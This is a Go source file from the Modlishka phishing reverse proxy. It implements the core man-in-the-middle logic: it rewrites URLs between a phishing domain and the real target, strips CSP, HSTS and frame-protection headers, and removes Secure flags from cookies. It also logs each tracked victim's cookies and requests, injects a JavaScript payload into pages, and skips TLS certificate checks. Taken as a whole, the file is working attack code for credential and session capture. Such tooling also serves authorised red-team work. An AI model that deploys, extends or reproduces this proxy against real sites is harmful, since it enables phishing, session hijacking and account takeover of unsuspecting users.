/**

    "Modlishka" Reverse Proxy.

    Copyright 2018 (C) Piotr Duszyński piotr[at]duszynski.eu. All rights reserved.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

    You should have received a copy of the Modlishka License along with this program.

**/

package core

import (
	"bytes"
	"compress/flate"
	"compress/gzip"
	"crypto/tls"
	"fmt"
	"github.com/drk1wi/Modlishka/config"
	"github.com/drk1wi/Modlishka/log"
	"github.com/drk1wi/Modlishka/plugin"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strconv"
	"strings"
	"time"

	"github.com/dsnet/compress/brotli"
)

type ReverseProxy struct {
	Target         *url.URL               // target url after going through reverse proxy
	OriginalTarget string                 // target host before going through reverse proxy
	Origin         string                 // origin before going through reverse proxy
	PhishUser      string                 // traced phish_user id
	InitPhishUser  string                 // traced phish_user id
	IP             string                 // client ip addr
	Payload        string                 // JS payload that should be injected
	Terminate      bool                   // indicates whether this client should be released/terminated
	Proxy          *httputil.ReverseProxy // instance of Go ReverseProxy that will proxy requests/responses
	Config         *config.Options

	IsTLS bool
	ForceHttps bool
}

type Settings struct {
	config.Options
	target         string
	originaltarget string
	origin         string
}

type HTTPResponse struct {
	*http.Response
}

type HTTPRequest struct {
	*http.Request
}

func (p *ReverseProxy) rewriteResponse(r *http.Response) (err error) {
	defer log.FunctionTracking(time.Now(), "rewriteResponse")

	response := HTTPResponse{r}
	response.PatchHeaders(p)

	if !IsValidMediaType(response.Header.Get("Content-Type")) {
		return
	}

	// Decompress, if compressed, the HTTP Response before processing
	buffer, err := response.Decompress()
	if err != nil {
		log.Errorf("%+v", err)
		return
	}

	log.Debugf("[rw] Rewriting Response Body for (%+v): status[%d] type[%+v] encoding[%+v] uncompressedBody[%d bytes]",
		p.Target, response.StatusCode, response.Header.Get("Content-Type"),
		response.Header.Get("Content-Encoding"), len(buffer))

	// Translate URLs
	buffer = p.PatchURL(buffer)

	// Inject Payloads
	buffer = p.InjectPayloads(buffer)

	log.Cookies(p.PhishUser, p.Target.String(), response.Header["Set-Cookie"], p.IP)

	// Hook Plugins
	ctx := plugin.HTTPContext{
		Target:    p.Target,
		IP:        p.IP,
		Origin:    p.Origin,
		PhishUser: p.PhishUser,
	}
	ctx.InvokeHTTPResponseHooks(response.Response)

	// Compress the HTTP Response and update the HTTP Headers
	response.Compress(buffer)

	return
}

func (p *ReverseProxy) rewriteRequest(r *http.Request) (err error) {
	defer log.FunctionTracking(time.Now(), "rewriteRequest")

	request := HTTPRequest{r}
	request.PatchHeaders(p)
	request.PatchQueryString()

	// Hook Plugins
	ctx := plugin.HTTPContext{
		Target:         p.Target,
		IP:             p.IP,
		Origin:         p.Origin,
		PhishUser:      p.PhishUser,
		OriginalTarget: p.OriginalTarget,
	}
	ctx.InvokeHTTPRequestHooks(request.Request)

	log.HTTPRequest(request.Request, p.PhishUser)

	// Handle HTTP Body (POST)
	if r.Body != nil {
		reader := r.Body
		buffer, err := ioutil.ReadAll(reader)
		if err != nil {
			return err
		}

		buffer = []byte(RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(string(buffer), PhishURLToRealURL))

		request.Body = ioutil.NopCloser(bytes.NewReader(buffer))
		request.ContentLength = int64(len(buffer))
		request.Header.Set("Content-Length", strconv.Itoa(len(buffer)))

		err = reader.Close()
		if err != nil {
			return err
		}

		err = r.Body.Close()
		if err != nil {
			return err
		}
	}

	return
}

func (httpRequest *HTTPRequest) PatchHeaders(p *ReverseProxy) {

	defer log.FunctionTracking(time.Now(), "PatchHeaders: HTTPRequest")

	httpRequest.Host = httpRequest.URL.Host

	// Patch HTTP Origin:
	origin := ""
	if p.Origin != "" {
		origin = RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(p.Origin, PhishURLToRealURL)

		if origin != "" {
			log.Debugf("Patching request Origin [%s] -> [%s]", p.Origin, origin)
			httpRequest.Header.Set("Origin", origin)
		}
	}

	// Patch HTTP Referer:
	// Prevent phish domain leakage via referer
	if httpRequest.Referer() != "" {
		newReferer := RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(httpRequest.Referer(), PhishURLToRealURL)
		httpRequest.Header.Set("Referer", newReferer)

		log.Debugf("Patching request Referer [%s] -> [%s]", httpRequest.Referer(), newReferer)
	}

	// Patch Cookies:
	// Prevent phish domain leakage via cookies
	if httpRequest.Header.Get("Cookie") != "" {
		cookie := RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(httpRequest.Header.Get("Cookie"), PhishURLToRealURL)
		if TrackingCookie != "" {
			cookie = RegexpCookieTracking.ReplaceAllString(cookie, "")
		}
		log.Debugf("Patching request Cookies [%s] -> [%s]", httpRequest.Header.Get("Cookie"), cookie)
		httpRequest.Header.Set("Cookie", cookie)

	}

	return
}

func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {

	defer log.FunctionTracking(time.Now(), "PatchHeaders: HTTPResponse")

	// Patch HTTP Origin:
	if p.Origin != "" {
		if httpResponse.Header.Get("Access-Control-Allow-Origin") == "*" {
			p.Origin = "*"
		}

		httpResponse.Header.Set("Access-Control-Allow-Origin", p.Origin)
		httpResponse.Header.Set("Access-Control-Allow-Credentials", "true")

		log.Debugf("[rw] Patching Response Origin [%s] -> [%s]", httpResponse.Header.Get("Access-Control-Allow-Origin"), p.Origin)
	}

	// Strip security HTTP headers
	var SECURITY = []string{
		"Content-Security-Policy",
		"Content-Security-Policy-Report-Only",
		"Strict-Transport-Security",
		"X-XSS-Protection",
		"X-Content-Type-Options",
		"X-Frame-Options",
	}
	for _, header := range SECURITY {
		httpResponse.Header.Del(header)
	}

	// Patch Cookies:
	// Prevent phish domain leakage via cookies
	if len(httpResponse.Header["Set-Cookie"]) > 0 {
		log.Cookies(p.PhishUser, p.Target.String(), httpResponse.Header["Set-Cookie"], p.IP)

		for i, v := range httpResponse.Header["Set-Cookie"] {
			//strip out the secure Flag
			r := strings.NewReplacer("Secure", "", "secure", "")
			cookie := r.Replace(v)
			cookie = RegexpFindSetCookie.ReplaceAllStringFunc(cookie, TranslateSetCookie)
			log.Debugf("Rewriting Set-Cookie Flags: from \n[%s]\n --> \n[%s]\n", httpResponse.Header["Set-Cookie"][i], cookie)
			httpResponse.Header["Set-Cookie"][i] = cookie
		}
	}

	if p.InitPhishUser != "" {
		// Add tracking cookie
		value := TrackingCookie + "=" + p.InitPhishUser +
			";Path=/;Domain=" + PhishingDomain +
			";Expires=Sat, 26-Oct-2025 18:54:56 GMT;Priority=HIGH"
		httpResponse.Header.Add("Set-Cookie", value)
	}

	if p.Terminate {
		log.Infof("Terminating session")

		// Set Terminator Cookie
		value := TERMINATE_SESSION_COOKIE_NAME + "=" + TERMINATE_SESSION_COOKIE_VALUE +
			";Path=/;Domain=." + PhishingDomain +
			";Expires=Sat, 26-Oct-2025 18:54:56 GMT;HttpOnly;Priority=HIGH"
		httpResponse.Header.Add("Set-Cookie", value)
	}

	// Patch WWW-Authenticate:
	if len(httpResponse.Header["WWW-Authenticate"]) > 0 {
		oldAuth := httpResponse.Header.Get("WWW-Authenticate")
		newAuth := RegexpUrl.ReplaceAllStringFunc(oldAuth, RealURLtoPhish)

		log.Debugf("Rewriting WWW-Authenticate: from \n[%s]\n --> \n[%s]\n", oldAuth, newAuth)
		httpResponse.Header.Set("WWW-Authenticate", newAuth)
	}

	//handle 302
	if httpResponse.Header.Get("Location") != "" {
		oldLocation := httpResponse.Header.Get("Location")
		newLocation := RegexpUrl.ReplaceAllStringFunc(string(oldLocation), RealURLtoPhish)

		if len(TargetResources) > 0 {
			for _, res := range TargetResources {
				newLocation = strings.Replace(newLocation, res, RealURLtoPhish(res), -1)
			}
		}

		if (p.IsTLS == true || p.ForceHttps == true) {
			newLocation = strings.Replace(newLocation, "http://", "https://", -1)
		} else {
			newLocation = strings.Replace(newLocation, "https://", "http://", -1)
		}

		log.Debugf("Rewriting Location Header [%s] to [%s]", oldLocation, newLocation)
		httpResponse.Header.Set("Location", newLocation)
	}

	return
}

func (httpRequest *HTTPRequest) PatchQueryString() {

	queryString := httpRequest.URL.Query()
	if len(queryString) > 0 {
		var qParams []string
		for key := range httpRequest.URL.Query() {
			//fmt.Println(queryString[key])
			for i, v := range queryString[key] {
				qParams = append(qParams, fmt.Sprintf("%s = %s", key, v))
				queryString[key][i] = RegexpPhishSubdomainUrlWithoutScheme.ReplaceAllStringFunc(v, PhishURLToRealURL)
			}
		}

		//Prevent leakage of the tracking parameter
		delete(queryString, TrackingParam)
		httpRequest.URL.RawQuery = queryString.Encode()
	}

	return
}

func (httpResponse *HTTPResponse) Decompress() (buffer []byte, err error) {

	body := httpResponse.Body
	compression := httpResponse.Header.Get("Content-Encoding")

	var reader io.ReadCloser

	switch compression {
	case "x-gzip":
		log.Debugf("X-Gzip, fallthrough gzip")
		fallthrough
	case "gzip":
		// A format using the Lempel-Ziv coding (LZ77), with a 32-bit CRC.
		// This is the original format of the UNIX gzip program.
		// The HTTP/1.1 standard also recommends that the servers supporting this content-encoding should recognize
		// x-gzip as an alias, for compatibility purposes.

		reader, err = gzip.NewReader(body)
		if err != io.EOF {
			buffer, _ = ioutil.ReadAll(reader)
			defer reader.Close()
		} else {
			// Unset error
			err = nil
		}

	case "deflate":
		// Using the zlib structure (defined in RFC 1950) with the deflate compression algorithm (defined in RFC 1951).

		reader = flate.NewReader(body)
		buffer, _ = ioutil.ReadAll(reader)
		defer reader.Close()

	case "br":
		// A format using the Brotli algorithm.

		c := brotli.ReaderConfig{}
		reader, err = brotli.NewReader(body, &c)
		buffer, _ = ioutil.ReadAll(reader)
		defer reader.Close()

	case "compress":
		// Unhandled: Fallback to default

		// A format using the Lempel-Ziv-Welch (LZW) algorithm.
		// The value name was taken from the UNIX compress program, which implemented this algorithm.
		// Like the compress program, which has disappeared from most UNIX distributions,
		// this content-encoding is not used by many browsers today, partly because of a patent issue (it expired in 2003).
		log.Debugf("compress, fallthrough default")
		fallthrough

	default:
		log.Debugf("Fallback to default compression (%s)", compression)

		reader = body
		buffer, err = ioutil.ReadAll(reader)
		if err != nil {
			return nil, err
		}
		defer reader.Close()
	}

	return
}

func (httpResponse *HTTPResponse) Compress(buffer []byte) {

	compression := httpResponse.Header.Get("Content-Encoding")
	switch compression {
	case "x-gzip":
		fallthrough
	case "gzip":
		buffer = gzipBuffer(buffer)

	case "deflate":
		buffer = deflateBuffer(buffer)

	case "br":
		// Brotli writer is not available just compress with something else
		httpResponse.Header.Set("Content-Encoding", "deflate")
		buffer = deflateBuffer(buffer)

	default:
		// Whatif?
	}

	body := ioutil.NopCloser(bytes.NewReader(buffer))
	httpResponse.Body = body
	httpResponse.ContentLength = int64(len(buffer))
	httpResponse.Header.Set("Content-Length", strconv.Itoa(len(buffer)))

	err := httpResponse.Body.Close()
	if err != nil {
		log.Debugf("%s", err.Error())
	}
}

func (p *ReverseProxy) InjectPayloads(buffer []byte) []byte {

	if len(buffer) > 0 && p.Payload != "" {
		log.Debugf(" -- Injecting JS Payload [%s] \n", p.Payload)
		buffer = bytes.Replace(buffer, []byte("</head>"), []byte("<script>"+p.Payload+"</script></head>"), 1)
	}

	return buffer

}

func (p *ReverseProxy) PatchURL(buffer []byte) []byte {

	// Fix protocol
	if (p.IsTLS == false && p.ForceHttps == false) {
		buffer = bytes.Replace(buffer, []byte("https"), []byte("http"), -1)
	}

	// Translate URLs
	buffer = []byte(RegexpUrl.ReplaceAllStringFunc(string(buffer), RealURLtoPhish))

	if len(ReplaceStrings) > 0 {
		for key, value := range ReplaceStrings {
			buffer = bytes.Replace(buffer, []byte(key), []byte(value), -1)
		}
	}

	if len(TargetResources) > 0 {
		for _, res := range TargetResources {
			buffer = bytes.Replace(buffer, []byte(res), []byte(RealURLtoPhish(res)), -1)
		}
	}

	return buffer
}




// ReverseProxy factory
func (s *Settings) NewReverseProxy() *ReverseProxy {

	targetURL, _ := url.Parse(s.target)

	rp := &ReverseProxy{
		Target:         targetURL,
		Origin:         s.origin,
		Proxy:          httputil.NewSingleHostReverseProxy(targetURL),
		Config:         &s.Options,
		IsTLS:          *s.UseTls,
		ForceHttps:     *s.ForceHttps,
		OriginalTarget: s.originaltarget,
	}


	// Ignoring invalid target certificates
	rp.Proxy.Transport = &http.Transport{

		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			Renegotiation: tls.RenegotiateFreelyAsClient,
		},
		DialContext: (&net.Dialer{
			Timeout:   10 * time.Second,
			KeepAlive: 10 * time.Second,
		}).DialContext,
		TLSHandshakeTimeout:   10 * time.Second,
		ResponseHeaderTimeout: 10 * time.Second,
		ExpectContinueTimeout: 1 * time.Second,
		IdleConnTimeout:       5 * time.Second,


	}

	// Handling: Request
	director := rp.Proxy.Director
	rp.Proxy.Director = func(req *http.Request) {
		rp.IP = req.RemoteAddr
		err := rp.rewriteRequest(req)
		if err != nil {
			log.Warningf("Director rewriteRequest error %s", err.Error())
		}
		director(req)
	}

	rp.Proxy.ErrorHandler = func(w http.ResponseWriter, r *http.Request, err error) {
		log.Debugf("[Proxy error][Error: %s]", err.Error())
	}


	// Handling: Response
	rp.Proxy.ModifyResponse = rp.rewriteResponse

	return rp
}
